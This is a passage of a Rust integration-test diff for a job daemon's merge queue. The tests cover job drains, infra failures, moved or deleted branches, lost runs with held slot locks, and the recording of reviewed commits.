+        .ok()
+        .and_then(|s| s.trim().parse().ok())
+        .is_some_and(alive)
 }
 
 /// Wait until the fake docker has held every kill before execution.
@@ -4118,7 +5648,13 @@ async fn until_kills_held(gate: &Path, ids: &[&str]) {
     let start = Instant::now();
     for id in ids {
         let f = terrariumd::run_kill::job_pidfile(id);
-        while !gate.join(Path::new(&f).file_name().unwrap()).exists() {
+        // The file has the PID of the held kill once it is there whole.
+        let held = gate.join(Path::new(&f).file_name().unwrap());
+        while std::fs::read_to_string(&held)
+            .ok()
+            .and_then(|s| s.trim().parse::<u32>().ok())
+            .is_none()
+        {
             assert!(start.elapsed() < DEADLINE, "the kill of {id} never started");
             tokio::time::sleep(Duration::from_millis(20)).await;
         }
@@ -4293,7 +5829,7 @@ async fn lost_runs_are_killed_when_the_host_agent_is_back_and_keep_their_slots(f
         .collect();
     assert_eq!(l.len(), usize::from(flow == "code"), "{card}");
     // The requeued job writes its own file again when it runs.
-    let f = terrariumd::run_kill::job_pidfile(&cancel_id);
+    let f = private_job_pidfile(&cancel_id);
     assert!(!Path::new(&f).exists(), "{f} is left");
     // Now the slots are free: the requeued job and the queued validation
     // start. End them.
@@ -4386,10 +5922,16 @@ async fn a_lost_job_cancelled_during_its_kill_keeps_its_slot(flow: &'static str)
         .await
         .ok()
         .clone();
-    assert_eq!(
-        q["state"], "queued",
-        "a job took the slot of a cancelled lost job while its kill ran: {q}"
-    );
+    // Read the job, then the kill: a kill still held after the read ran
+    // during it, so the slot must still be taken. Under load the held kill
+    // can reach its own timeout first, and its slot is then free by
+    // design (TER-610).
+    if kill_still_held(&kill_gate, &run_id) {
+        assert_eq!(
+            q["state"], "queued",
+            "a job took the slot of a cancelled lost job while its kill ran: {q}"
+        );
+    }
     assert!(alive(lr.id()), "the kill ended before the check");
 
     drop(gate);
@@ -4628,6 +6170,175 @@ async fn a_drain_starts_no_job_and_lists_the_running_ones() {
     assert_eq!(r.ok()["on"], false);
     lab.until_card(&fast, "review", |c| c["column"] == "review")
         .await;
+}
+
+/// TER-614 R4: a drain of the job slots only starts no job, lets the
+/// running one finish, and leaves the agents alone (no full drain). The
+/// resume starts the queued job.
+#[tokio::test]
+async fn a_jobs_only_drain_holds_the_slots_and_not_the_agents() {
+    let lab = lab(2).await;
+    let state = lab.td.daemon.as_ref().unwrap().state.clone();
+    let work_dir = lab._dirs.path().join("jobs-drain-only");
+    let r = lab
+        .td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-box", "recipe": "if test -f SLOW; then sleep 6; fi; test -f OK",
+                   "slots": 2, "next_repos": ["app"],
+                   "work_dir": work_dir.display().to_string()}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let slow = queue_green(&lab, "ter-j1", "runs into the job drain", true).await;
+    let start = Instant::now();
+    let running = loop {
+        let j = job_of(&lab, &slow).await;
+        if j.first().is_some_and(|j| j["state"] == "running") {
+            break j[0]["id"].as_str().unwrap().to_owned();
+        }
+        assert!(
+            start.elapsed() < DEADLINE,
+            "the slow job never started: {j:?}"
+        );
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    };
+
+    let r = lab
+        .td
+        .post("/api/system/update/drain", json!({"jobs_only": true}))
+        .await;
+    let d = r.ok().clone();
+    assert_eq!(d["on"], false, "a jobs-only drain is no full drain: {d}");
+    assert!(d["jobs_drain"]["since"].is_string(), "{d}");
+    assert_eq!(d["jobs"], json!([running]), "{d}");
+    assert!(!state.self_update.draining());
+    assert!(state.self_update.jobs_draining());
+
+    let fast = queue_green(&lab, "ter-j2", "queued in the job drain", false).await;
+    tokio::time::sleep(Duration::from_millis(1500)).await;
+    terrariumd::jobs::tick(&state).await.unwrap();
+    let j = job_of(&lab, &fast).await;
+    assert_eq!(
+        j[0]["state"], "queued",
+        "a job started during the drain: {j:?}"
+    );
+
+    lab.until_card(&slow, "review", |c| c["column"] == "review")
+        .await;
+    let v = lab.td.get("/api/system/update").await.ok().clone();
+    assert_eq!(v["drain"]["jobs"], json!([]), "{v}");
+    assert!(v["drain"]["jobs_drain"].is_object(), "{v}");
+
+    let r = lab.td.post_empty("/api/system/update/resume").await;
+    assert!(r.ok()["jobs_drain"].is_null());
+    assert!(!state.self_update.jobs_draining());
+    lab.until_card(&fast, "review", |c| c["column"] == "review")
+        .await;
+}
+
+both_flows!(a_merge_that_fails_before_its_tests_keeps_its_cards_in_the_queue);
+/// TER-614 R3: a merge job that fails before its tests (the clone on the
+/// target fails, so there is no tested commit) is an infra failure: no
+/// split, no rerun as a test failure, no attempt used. It runs once more
+/// after the wait; the second such end ends it `infra`, and its cards stay
+/// in the merge queue with the failed step and the output in comments.
+async fn a_merge_that_fails_before_its_tests_keeps_its_cards_in_the_queue(flow: &'static str) {
+    terrariumd::jobs::set_infra_retry(Duration::from_millis(200));
+    let lab = lab_flow(2, flow).await;
+    with_merge_queue(&lab).await;
+    // A work dir under a file: the receive step on the target cannot make
+    // the slot tree.
+    let file = lab._dirs.path().join("not-a-dir");
+    std::fs::write(&file, "x").unwrap();
+    let r = lab
+        .td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-box", "recipe": "test -f OK",
+                   "slots": 2, "next_repos": ["app"],
+                   "work_dir": file.join("work").display().to_string()}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    lab.branch("ter-i1", "next", &[("i1", "1\n"), ("OK", "y\n")]);
+    lab.branch("ter-i2", "next", &[("i2", "2\n"), ("OK", "y\n")]);
+    let c1 = lab.card("i1", "ter-i1").await;
+    let c2 = lab.card("i2", "ter-i2").await;
+    for c in [&c1, &c2] {
+        accept(&lab, c).await;
+    }
+    let r = lab
+        .td
+        .post_as(&lab.lead, "/api/merges", json!({"cards": [c1, c2]}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let jobs = lab.until_idle().await;
+    assert_eq!(jobs.len(), 1, "no split and no rerun job: {jobs:#?}");
+    let j = &jobs[0];
+    assert_eq!(j["state"], "failed", "{j:#}");
+    assert_eq!(j["outcome"], "infra", "{j:#}");
+    assert_eq!(j["attempt"], 1, "no attempt used: {j:#}");
+    let tail = j["tail"].as_str().unwrap();
+    assert!(tail.ends_with("[failed step: receive]"), "{tail}");
+    for id in [&c1, &c2] {
+        let c = lab
+            .until_card(id, "infra comment", |c| {
+                comments(c).contains("failed before its tests again")
+            })
+            .await;
+        assert_eq!(c["column"], "merge_queue", "{c:#}");
+        let text = comments(&c);
+        assert!(text.contains("the job runs once more in"), "{text}");
+        assert!(text.contains("failed step: receive"), "{text}");
+        assert!(!text.contains("splits to find"), "{text}");
+        let l = labels(&c);
+        assert!(!l.iter().any(|l| l.starts_with("validation:")), "{l:?}");
+        assert!(!c["body"].as_str().unwrap().contains("Validation failed"));
+    }
+    lab.settle().await;
+    assert_eq!(lab.failed_rule_runs().await, Vec::<Value>::new());
+}
+
+both_flows!(a_deleted_card_branch_leaves_the_batch_and_the_others_merge);
+/// TER-614 review, major 1: a card branch deleted after the accept is a
+/// failure of that card, not of the host. The card leaves the batch to the
+/// top of ready with the reason; the other cards merge in the same job.
+async fn a_deleted_card_branch_leaves_the_batch_and_the_others_merge(flow: &'static str) {
+    let lab = lab_flow(2, flow).await;
+    with_merge_queue(&lab).await;
+    let h1 = lab.branch("ter-g1", "next", &[("g1", "1\n"), ("OK", "y\n")]);
+    lab.branch("ter-g2", "next", &[("g2", "2\n"), ("OK", "y\n")]);
+    let h3 = lab.branch("ter-g3", "next", &[("g3", "3\n"), ("OK", "y\n")]);
+    let c1 = lab.card("g1", "ter-g1").await;
+    let c2 = lab.card("g2", "ter-g2").await;
+    let c3 = lab.card("g3", "ter-g3").await;
+    for c in [&c1, &c2, &c3] {
+        accept(&lab, c).await;
+    }
+    git(&lab.work, &["push", "-q", "origin", "--delete", "ter-g2"]);
+    let r = lab
+        .td
+        .post_as(&lab.lead, "/api/merges", json!({"cards": [c1, c2, c3]}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let g2 = lab
+        .until_card(&c2, "ready", |c| c["column"] == "ready")
+        .await;
+    let body = g2["body"].as_str().unwrap();
+    assert!(body.contains("cannot be fetched"), "{body}");
+    for c in [&c1, &c3] {
+        lab.until_card(c, "accepted", |c| c["column"] == "accepted")
+            .await;
+    }
+    let jobs = lab.until_idle().await;
+    assert_eq!(jobs.len(), 1, "no rerun and no split: {jobs:#?}");
+    assert_eq!(jobs[0]["state"], "passed", "{jobs:#?}");
+    for h in [&h1, &h3] {
+        git(&lab.origin, &["merge-base", "--is-ancestor", h, "next"]);
+    }
+    lab.settle().await;
+    assert_eq!(lab.failed_rule_runs().await, Vec::<Value>::new());
 }
 
 both_flows!(a_job_waits_for_an_offline_host_agent_and_starts_when_it_connects);
@@ -4912,6 +6623,152 @@ async fn a_lost_host_agent_session_reruns_the_whole_batch() {
     );
 }
 
+// ------------------------------------------------------------- TER-676
+
+/// True when `flock` with a wait works here: the TER-676 tests need it.
+fn flock_waits() -> bool {
+    std::process::Command::new("sh")
+        .args([
+            "-c",
+            "command -v flock >/dev/null 2>&1 && flock -E 75 -w 1 /dev/null true",
+        ])
+        .output()
+        .is_ok_and(|o| o.status.success())
+}
+
+/// A process outside the job's run that takes the lock `lock` of a slot
+/// tree as soon as it is free, and keeps it for `secs`. It waits in its
+/// own process group, so the kill of a lost run does not end it, and
+/// [`stop_group`] does.
+fn slot_holder(lock: &Path, secs: u32) -> std::process::Child {
+    use std::os::unix::process::CommandExt;
+    std::process::Command::new("flock")
+        .args(["-w", "300"])
+        .arg(lock)
+        .args(["sleep", &secs.to_string()])
+        .process_group(0)
+        .spawn()
+        .unwrap()
+}
+
+/// End the process group of `child` and reap it.
+fn stop_group(mut child: std::process::Child) {
+    let _ = std::process::Command::new("kill")
+        .args(["-KILL", "--", &format!("-{}", child.id())])
+        .status();
+    let _ = child.wait();
+}
+
+/// Queue a merge of one card whose first run sleeps until it is lost and
+/// whose rerun passes. When the recipe runs, `hold` secs of a slot holder
+/// start (it gets the lock once the lost run lets go of it), and the host
+/// agent restarts: the run is lost. `wait`: the cap of the wait for the
+/// slot lock of this job. Returns the card, the job, and the holder.
+async fn lose_a_run_with_a_held_slot(
+    lab: &Lab,
+    m: &Path,
+    hold: u32,
+    wait: Option<u64>,
+) -> (String, String, std::process::Child) {
+    let md = m.display().to_string();
+    set_recipe(
+        lab,
+        &format!(
+            "test -f OK && echo run >> '{md}/runs' && \
+             if test -f '{md}/ran'; then exit 0; fi; touch '{md}/ran'; sleep 600"
+        ),
+    )
+    .await;
+    lab.branch("ter-h1", "next", &[("OK", "yes\n"), ("h1", "1")]);
+    let c1 = lab.card("h1", "ter-h1").await;
+    let r = lab
+        .td
+        .post_as(&lab.lead, "/api/merges", json!({"cards": [c1]}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let job_id = r.body["job"]["id"].as_str().unwrap().to_owned();
+    if let Some(w) = wait {
+        terrariumd::jobs::set_lost_slot_wait(&job_id, w);
+    }
+    let ran = m.join("ran");
+    let start = Instant::now();
+    while !ran.exists() {
+        assert!(start.elapsed() < DEADLINE, "the recipe never started");
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+    // The holder waits for the lock that the lost run holds: when the
+    // kill ends the run, the holder has it before the daemon looks.
+    let lock = lab._dirs.path().join("jobs/p/slot-0.lock");
+    assert!(lock.exists(), "no slot lock at {}", lock.display());
+    let holder = slot_holder(&lock, hold);
+    lab.agent_down().await;
+    lab.agent_up().await;
+    (c1, job_id, holder)
+}
+
+/// TER-676: the slot of a lost run is still held for a few seconds after
+/// its kill (here by a process that the kill does not reach, as a run
+/// that ends slowly under load). The job goes back to the queue only
+/// when the lock is free, so its rerun does not fail in the receive step
+/// as held, and the card merges.
+#[tokio::test]
+async fn a_lost_run_reruns_only_after_its_slot_lock_is_free() {
+    if !flock_waits() {
+        eprintln!("skipped: no flock with -w and -E here");
+        return;
+    }
+    let lab = lab(1).await;
+    let marks = tempfile::tempdir().unwrap();
+    let (c1, job_id, holder) = lose_a_run_with_a_held_slot(&lab, marks.path(), 6, None).await;
+    let card = lab
+        .until_card(&c1, "accepted", |c| c["column"] == "accepted")
+        .await;
+    stop_group(holder);
+    let text = comments(&card);
+    assert!(!text.contains("is held by another job"), "{card}");
+    assert!(!text.contains("failed before its tests"), "{card}");
+    let j = lab
+        .td
+        .get(&format!("/api/jobs/{job_id}"))
+        .await
+        .ok()
+        .clone();
+    assert_eq!(j["state"], "passed", "{j:#}");
+    assert_eq!(j["attempt"], 1, "{j:#}");
+    let runs = std::fs::read_to_string(marks.path().join("runs")).unwrap();
+    assert_eq!(runs.lines().count(), 2, "{runs}");
+}
+
+/// TER-676: when the slot of a lost run stays held past the cap of the
+/// wait, the job does not rerun into a receive step that fails as held.
+/// It ends as an infra failure (a merge), with the lock in its tail.
+#[tokio::test]
+async fn a_lost_run_whose_slot_stays_held_ends_with_the_lock_in_its_tail() {
+    if !flock_waits() {
+        eprintln!("skipped: no flock with -w and -E here");
+        return;
+    }
+    let lab = lab(1).await;
+    let marks = tempfile::tempdir().unwrap();
+    let (_c1, job_id, holder) = lose_a_run_with_a_held_slot(&lab, marks.path(), 120, Some(2)).await;
+    let jobs = lab.until_idle().await;
+    stop_group(holder);
+    assert_eq!(jobs.len(), 1, "{jobs:#?}");
+    let j = lab
+        .td
+        .get(&format!("/api/jobs/{job_id}"))
+        .await
+        .ok()
+        .clone();
+    assert_eq!(j["state"], "failed", "{j:#}");
+    assert_eq!(j["outcome"], "infra", "{j:#}");
+    let tail = j["tail"].as_str().unwrap_or("");
+    assert!(tail.contains("its kill did not end it"), "{tail}");
+    assert!(tail.contains("slot-0.lock"), "{tail}");
+    let runs = std::fs::read_to_string(marks.path().join("runs")).unwrap();
+    assert_eq!(runs.lines().count(), 1, "the job reran: {runs}");
+}
+
 /// TER-196 review 2, major 1: a run that the infrastructure lost past
 /// `MAX_LOST_RERUNS` ends red, but only after the kill of a lost run. The
 /// delivery moved to another host while the recipe ran, so that kill
@@ -5028,4 +6885,620 @@ async fn a_lost_run_past_the_cap_ends_red_after_the_kill() {
             .status();
         panic!("the capped lost run {pid} outlived its end");
     }
+}
+
+/// The lab board with a merge queue column (TER-553).
+async fn with_merge_queue(lab: &Lab) {
+    let r = lab
+        .td
+        .patch(
+            "/api/projects/p/board",
+            json!({"columns": [
+                {"name": "backlog"}, {"name": "ready"},
+                {"name": "in_progress", "role": "working"}, {"name": "validating"},
+                {"name": "review"}, {"name": "merge_queue", "role": "merge_queue"},
+                {"name": "accepted"},
+                {"name": "blocked", "role": "blocked"}, {"name": "done"}]}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+}
+
+/// The lead moves card `id` to review, then accepts it into the merge
+/// queue (TER-553).
+async fn accept(lab: &Lab, id: &str) {
+    for column in ["review", "merge_queue"] {
+        let r = lab
+            .td
+            .post_as(
+                &lab.lead,
+                &format!("/api/cards/{id}/move"),
+                json!({"column": column}),
+            )
+            .await;
+        assert_eq!(r.status, 200, "{}", r.body);
+    }
+}
+
+/// A commit more on `branch` of the remote, after its review: its head.
+fn push_after_review(lab: &Lab, branch: &str, file: &str) -> String {
+    git(&lab.work, &["fetch", "-q", "origin"]);
+    git(
+        &lab.work,
+        &["checkout", "-q", "-B", branch, &format!("origin/{branch}")],
+    );
+    std::fs::write(lab.work.join(file), "not reviewed\n").unwrap();
+    git(&lab.work, &["add", "-A"]);
+    git(&lab.work, &["commit", "-q", "-m", "after the review"]);
+    git(&lab.work, &["push", "-q", "origin", branch]);
+    git(&lab.work, &["rev-parse", "HEAD"])
+}
+
+fn on_next(lab: &Lab, commit: &str) -> bool {
+    std::process::Command::new("git")
+        .arg("-C")
+        .arg(&lab.origin)
+        .args(["merge-base", "--is-ancestor", commit, "next"])
+        .status()
+        .unwrap()
+        .success()
+}
+
+both_flows!(a_push_after_the_accept_is_not_merged);
+/// TER-553 (Fable F1): the merge takes the commit that was the head of the
+/// branch at the review accept. A push after the accept never reaches
+/// `next`: the job ends `moved`, with no rerun, and the card goes back to
+/// review. A new accept records the new head, and that merge passes.
+async fn a_push_after_the_accept_is_not_merged(flow: &'static str) {
+    let lab = lab_flow(2, flow).await;
+    with_merge_queue(&lab).await;
+    let reviewed = lab.branch("ter-mv", "next", &[("mv", "1\n"), ("OK", "y\n")]);
+    let card = lab.card("mv", "ter-mv").await;
+    accept(&lab, &card).await;
+    let pushed = push_after_review(&lab, "ter-mv", "late");
+    let before = git(&lab.origin, &["rev-parse", "next"]);
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/merge"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    assert_eq!(r.body["job"]["commit"], reviewed.as_str(), "{}", r.body);
+    let c = lab
+        .until_card(&card, "review", |c| c["column"] == "review")
+        .await;
+    let jobs = lab.until_idle().await;
+    assert_eq!(jobs.len(), 1, "no rerun: {jobs:#?}");
+    assert_eq!(jobs[0]["state"], "failed", "{jobs:#?}");
+    assert_eq!(jobs[0]["outcome"], "moved", "{jobs:#?}");
+    assert_eq!(git(&lab.origin, &["rev-parse", "next"]), before);
+    assert!(!on_next(&lab, &pushed));
+    let text = comments(&c);
+    assert!(text.contains("moved after its review"), "{text}");
+    assert!(text.contains(&reviewed) && text.contains(&pushed), "{text}");
+    let l = labels(&c);
+    assert!(!l.iter().any(|l| l.starts_with("validation:")), "{l:?}");
+    assert!(c["assignee"].is_null(), "{c:#}");
+
+    // The lead reviews the new commit and accepts again: it merges.
+    let r = lab
+        .td
+        .post_as(
+            &lab.lead,
+            &format!("/api/cards/{card}/move"),
+            json!({"column": "merge_queue"}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/merge"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    assert_eq!(r.body["job"]["commit"], pushed.as_str(), "{}", r.body);
+    lab.until_card(&card, "accepted", |c| c["column"] == "accepted")
+        .await;
+    assert!(on_next(&lab, &pushed));
+}
+
+both_flows!(a_branch_that_moved_leaves_the_batch);
+/// TER-553: each card of a batch merges its reviewed commit. A card whose
+/// branch moved after the accept leaves the batch with the outcome
+/// `moved` and goes back to review; the other cards merge in the same job.
+async fn a_branch_that_moved_leaves_the_batch(flow: &'static str) {
+    let lab = lab_flow(2, flow).await;
+    with_merge_queue(&lab).await;
+    let h1 = lab.branch("ter-b1", "next", &[("b1", "1\n"), ("OK", "y\n")]);
+    lab.branch("ter-b2", "next", &[("b2", "2\n"), ("OK", "y\n")]);
+    let h3 = lab.branch("ter-b3", "next", &[("b3", "3\n"), ("OK", "y\n")]);
+    let c1 = lab.card("b1", "ter-b1").await;
+    let c2 = lab.card("b2", "ter-b2").await;
+    let c3 = lab.card("b3", "ter-b3").await;
+    for c in [&c1, &c2, &c3] {
+        accept(&lab, c).await;
+    }
+    let pushed = push_after_review(&lab, "ter-b2", "late");
+    let r = lab
+        .td
+        .post_as(&lab.lead, "/api/merges", json!({"cards": [c1, c2, c3]}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let b2 = lab
+        .until_card(&c2, "review", |c| c["column"] == "review")
+        .await;
+    for c in [&c1, &c3] {
+        lab.until_card(c, "accepted", |c| c["column"] == "accepted")
+            .await;
+    }
+    let jobs = lab.until_idle().await;
+    assert_eq!(jobs.len(), 1, "{jobs:#?}");
+    assert_eq!(jobs[0]["state"], "passed", "{jobs:#?}");
+    assert_eq!(jobs[0]["batch"][1]["outcome"], "moved", "{jobs:#?}");
+    assert!(on_next(&lab, &h1) && on_next(&lab, &h3));
+    assert!(!on_next(&lab, &pushed));
+    assert_eq!(
+        next_merges(&lab),
+        ["Merge ter-b1 onto next", "Merge ter-b3 onto next"]
+    );
+    let text = comments(&b2);
+    assert!(text.contains("moved after its review"), "{text}");
+    assert!(text.contains(&pushed), "{text}");
+}
+
+/// TER-553: the batch rule takes a card only with its reviewed commit, and
+/// the batch job carries it. A card that came into the merge queue
+/// without a review accept (a role given to its column later) has none,
+/// and the batch leaves it out with the reason.
+#[tokio::test]
+async fn the_batch_rule_takes_the_reviewed_commit() {
+    let lab = lab_flow(2, "rules").await;
+    with_merge_queue(&lab).await;
+    lab.branch("ter-r1", "next", &[("r1", "1\n"), ("OK", "y\n")]);
+    let c1 = lab.card("r1", "ter-r1").await;
+    accept(&lab, &c1).await;
+    push_after_review(&lab, "ter-r1", "late");
+    let db = lab.td.daemon.as_ref().unwrap().state.db.clone();
+    let pick = db
+        .read(|c| terrariumd::rules_verbs::pick_batch(c, "p", "merge_queue", None))
+        .await
+        .unwrap();
+    assert_eq!(pick.cards.len(), 1, "{pick:?}");
+    // A card put into the column without a move has no round.
+    lab.branch("ter-r2", "next", &[("r2", "2\n"), ("OK", "y\n")]);
+    let c2 = lab.card("r2", "ter-r2").await;
+    let id = c2.clone();
+    db.write("test", move |t| {
+        t.execute(
+            "UPDATE cards SET column_id = (SELECT id FROM board_columns
+               WHERE project = 'p' AND name = 'merge_queue') WHERE id = ?1",
+            [&id],
+        )?;
+        Ok(())
+    })
+    .await
+    .unwrap();
+    let pick = db
+        .read(|c| terrariumd::rules_verbs::pick_batch(c, "p", "merge_queue", None))
+        .await
+        .unwrap();
+    let ids: Vec<&str> = pick.cards.iter().map(|c| c.id.as_str()).collect();
+    assert_eq!(ids, [c1.as_str()], "{pick:?}");
+    let out = format!("{:?}", pick.left_out);
+    assert!(
+        out.contains(&c2) && out.contains("no reviewed commit"),
+        "{out}"
+    );
+}
+
+/// The round of `card` in the merge queue: its commit, its note, and
+/// whether it needs a fresh accept (TER-580).
+async fn round_of(lab: &Lab, card: &str) -> Option<(Option<String>, Option<String>, bool)> {
+    let db = lab.td.daemon.as_ref().unwrap().state.db.clone();
+    let id = card.to_owned();
+    db.read(move |c| {
+        use rusqlite::OptionalExtension;
+        Ok(c.query_row(
+            "SELECT commit_sha, note, needs_accept FROM card_accepted_heads WHERE card = ?1",
+            [&id],
+            |r| Ok((r.get(0)?, r.get(1)?, r.get::<_, i64>(2)? == 1)),
+        )
+        .optional()?)
+    })
+    .await
+    .unwrap()
+}
+
+/// Run a write of SQL `sql` with the card ID as `?1` (TER-580).
+async fn sql_on(lab: &Lab, card: &str, sql: &'static str) {
+    let db = lab.td.daemon.as_ref().unwrap().state.db.clone();
+    let id = card.to_owned();
+    db.write("test", move |t| {
+        t.execute(sql, [&id])?;
+        Ok(())
+    })
+    .await
+    .unwrap();
+}
+
+/// Hold the background read of the reviewed commits (TER-580).
+fn hold_reads(lab: &Lab, hold: bool) {
+    lab.td
+        .daemon
+        .as_ref()
+        .unwrap()
+        .state
+        .job_queue
+        .hold_accepted_reads(hold);
+}
+
+/// TER-580: a move by the role name `merge_queue`, to a column with that
+/// role and another name, reads the head before the write and records it
+/// in the move. The background read is held, so the record is the
+/// pre-read's.
+#[tokio::test]
+async fn a_move_by_role_name_records_the_reviewed_commit() {
+    let lab = lab_flow(2, "code").await;
+    let r = lab
+        .td
+        .patch(
+            "/api/projects/p/board",
+            json!({"columns": [
+                {"name": "backlog"}, {"name": "ready"},
+                {"name": "in_progress", "role": "working"}, {"name": "review"},
+                {"name": "queue", "role": "merge_queue"}, {"name": "accepted"},
+                {"name": "blocked", "role": "blocked"}, {"name": "done"}]}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let reviewed = lab.branch("ter-rn", "next", &[("rn", "1\n"), ("OK", "y\n")]);
+    let card = lab.card("rn", "ter-rn").await;
+    hold_reads(&lab, true);
+    for column in ["review", "merge_queue"] {
+        let r = lab
+            .td
+            .post_as(
+                &lab.lead,
+                &format!("/api/cards/{card}/move"),
+                json!({"column": column}),
+            )
+            .await;
+        assert_eq!(r.status, 200, "{}", r.body);
+    }
+    assert_eq!(lab.card_of(&card).await["column"], "queue");
+    let (commit, _, needs) = round_of(&lab, &card).await.expect("a round");
+    assert_eq!(commit.as_deref(), Some(reviewed.as_str()));
+    assert!(!needs);
+}
+
+/// TER-580: the accept verdict of a review agent moves the card into the
+/// merge queue in the comment write, and the comment pre-read records the
+/// head in that write. The background read is held.
+#[tokio::test]
+async fn a_review_accept_comment_records_the_reviewed_commit() {
+    let lab = lab_flow(2, "code").await;
+    with_merge_queue(&lab).await;
+    let r = lab
+        .td
+        .post(
+            "/api/templates",
+            json!({"name": "card-review", "project": "p", "spec": {"harness": "codex"}}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let r = lab
+        .td
+        .patch(
+            &format!("/api/agents/{}", lab.lead),
+            json!({"policy": {"spawn": {"templates": ["project:*"], "bound": true,
+                                        "max_concurrent": 4}}}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = lab
+        .td
+        .patch("/api/projects/p", json!({"review_dispatcher": "lead"}))
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let reviewed = lab.branch("ter-rv", "next", &[("rv", "1\n"), ("OK", "y\n")]);
+    let card = lab.card("rv", "ter-rv").await;
+    let r = lab
+        .td
+        .post_as(
+            &lab.lead,
+            &format!("/api/cards/{card}/move"),
+            json!({"column": "review"}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let state = lab.td.daemon.as_ref().unwrap().state.clone();
+    assert!(
+        terrariumd::review_dispatcher::dispatch(&state, "p")
+            .await
+            .unwrap()
+    );
+    let id = card.clone();
+    let agent: String = state
+        .db
+        .read(move |c| {
+            Ok(c.query_row(
+                "SELECT agent FROM card_reviews WHERE card = ?1",
+                [&id],
+                |r| r.get(0),
+            )?)
+        })
+        .await
+        .unwrap();
+    hold_reads(&lab, true);
+    let r = lab
+        .td
+        .post_as(
+            &agent,
+            &format!("/api/cards/{card}/comments"),
+            json!({"body": "Review verdict: accept\nChecked."}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    assert_eq!(lab.card_of(&card).await["column"], "merge_queue");
+    let (commit, _, _) = round_of(&lab, &card).await.expect("a round");
+    assert_eq!(commit.as_deref(), Some(reviewed.as_str()));
+}
+
+/// TER-580: a card in the merge queue whose round has no recorded commit
+/// is not merged at the head of its branch now: the API merge answers 409.
+/// The background read fills a fresh round, but not a round older than
+/// the cap: that one keeps a note and needs a fresh accept.
+#[tokio::test]
+async fn a_queued_card_without_its_reviewed_commit_is_not_merged() {
+    let lab = lab_flow(2, "code").await;
+    with_merge_queue(&lab).await;
+    let reviewed = lab.branch("ter-nr", "next", &[("nr", "1\n"), ("OK", "y\n")]);
+    let card = lab.card("nr", "ter-nr").await;
+    hold_reads(&lab, true);
+    accept(&lab, &card).await;
+    // The reviewed commit is of `ter-nr`: a merge of another branch of the
+    // queued card does not take that branch's head now.
+    lab.branch("ter-nr-other", "next", &[("other", "1\n"), ("OK", "y\n")]);
+    let r = lab
+        .td
+        .post_as(
+            &lab.lead,
+            &format!("/api/cards/{card}/merge"),
+            json!({"branch": "ter-nr-other"}),
+        )
+        .await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(r.body.to_string().contains("is of branch"), "{}", r.body);
+    // The pre-read failed, as when the remote did not answer.
+    sql_on(
+        &lab,
+        &card,
+        "UPDATE card_accepted_heads SET commit_sha = NULL, branch = NULL,
+                recorded_at = NULL WHERE card = ?1",
+    )
+    .await;
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/merge"), json!({}))
+        .await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(
+        r.body.to_string().contains("not recorded yet"),
+        "{}",
+        r.body
+    );
+    let r = lab
+        .td
+        .post_as(&lab.lead, "/api/merges", json!({"cards": [card]}))
+        .await;
+    assert_eq!(r.status, 409, "{}", r.body);
+
+    // A round past the cap is not filled: the read takes the tip now.
+    // The earlier cause of the failed read stays in the note.
+    sql_on(
+        &lab,
+        &card,
+        "UPDATE card_accepted_heads SET accepted_at = '2026-01-01T00:00:00.000Z',
+                note = 'the remote did not answer' WHERE card = ?1",
+    )
+    .await;
+    hold_reads(&lab, false);
+    let state = lab.td.daemon.as_ref().unwrap().state.clone();
+    assert_eq!(terrariumd::jobs::record_accepted_heads(&state).await, 0);
+    let (commit, note, _) = round_of(&lab, &card).await.expect("a round");
+    assert_eq!(commit, None);
+    let expired = format!(
+        "the remote did not answer; {}",
+        terrariumd::store::accepted_heads::EXPIRED_NOTE
+    );
+    assert_eq!(note.as_deref(), Some(expired.as_str()));
+    // One card comment says why the card waits, and how to go on.
+    assert_eq!(terrariumd::jobs::record_accepted_heads(&state).await, 0);
+    let text = comments(&lab.card_of(&card).await);
+    assert_eq!(text.matches("is not recorded").count(), 1, "{text}");
+    assert!(text.contains(&expired), "{text}");
+    assert!(
+        text.contains("move the card out of `merge_queue`"),
+        "{text}"
+    );
+    let (_, note, _) = round_of(&lab, &card).await.expect("a round");
+    assert_eq!(note.as_deref(), Some(expired.as_str()));
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/merge"), json!({}))
+        .await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(
+        r.body.to_string().contains("accept the card again"),
+        "{}",
+        r.body
+    );
+
+    // A fresh round within the cap is filled by the background read.
+    sql_on(
+        &lab,
+        &card,
+        "UPDATE card_accepted_heads SET note = NULL, tried_at = NULL,
+                accepted_at = strftime('%Y-%m-%dT%H:%M:%fZ', 'now') WHERE card = ?1",
+    )
+    .await;
+    assert_eq!(terrariumd::jobs::record_accepted_heads(&state).await, 1);
+    let (commit, _, _) = round_of(&lab, &card).await.expect("a round");
+    assert_eq!(commit.as_deref(), Some(reviewed.as_str()));
+    let r = lab
